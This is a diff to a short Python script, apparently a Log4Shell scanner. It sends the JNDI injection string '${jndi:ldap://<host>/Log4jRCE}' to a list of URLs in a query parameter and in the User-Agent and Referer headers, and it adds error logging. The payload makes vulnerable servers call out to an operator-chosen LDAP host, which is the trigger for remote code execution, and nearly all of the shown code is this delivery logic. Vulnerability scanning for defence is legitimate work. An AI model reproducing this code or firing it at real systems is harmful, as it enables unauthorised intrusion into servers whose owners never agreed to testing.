@@ -10,13 +10,14 @@ proxies = {}
 
 def sendDetectionRequest(url, urlId):
     try:
-        payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
+        payload = '${jndi:ldap://' +  argv[2] + '/Log4jRCE}'
         params = {'id':payload}
         headers = {'User-Agent':payload, 'Referer':payload}
         url = url.strip()
         print('[{}] Testing {}'.format(urlId, url))
         get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
     except Exception as e:
+        print('Exception on urlId={}, url={}:'.format(urlId, url))
         print(e)
         pass
 
